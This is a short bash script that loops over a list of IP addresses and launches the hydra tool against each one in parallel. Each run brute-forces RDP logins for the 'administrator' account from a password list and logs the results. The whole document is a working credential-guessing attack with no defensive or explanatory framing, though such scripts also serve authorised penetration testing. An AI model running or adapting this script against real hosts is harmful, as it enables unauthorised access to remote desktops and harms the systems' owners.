#!/bin/bash
filename='/tools/ips.txt'
filelines=`cat $filename`
echo Start
for ip in $filelines ; do
        /tools/hydra/hydra -t 4 -f -l administrator -P ./fake/passwords.txt rdp://$ip >> /var/log/bruteforce-rdp &
        echo $ip
done
